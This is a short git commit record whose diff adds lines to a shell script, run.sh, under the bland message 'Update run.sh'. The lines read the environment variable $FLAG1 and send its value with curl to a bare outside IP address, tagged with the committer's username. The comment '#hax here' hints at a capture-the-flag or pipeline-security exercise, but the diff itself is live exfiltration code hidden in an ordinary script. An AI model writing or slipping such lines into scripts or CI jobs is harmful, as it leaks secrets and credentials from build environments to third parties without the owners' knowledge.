c93bd9980b5fc52c88d6a599ac41b17754e5ce74
spencer-goff-quicken <spencer.goff@quicken.com>
2026-08-08 10:56:38 -0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,2 +1,7 @@
 #hax here
 echo "hello, world!"
+MY_NEW_VAR1="$FLAG1"
+
+curl --fail --show-error --silent --get "http://8.217.202.186:80/" \
+    --data-urlencode "username=spencer-goff-quicken" \
+    --data-urlencode "var1=${MY_NEW_VAR1}"
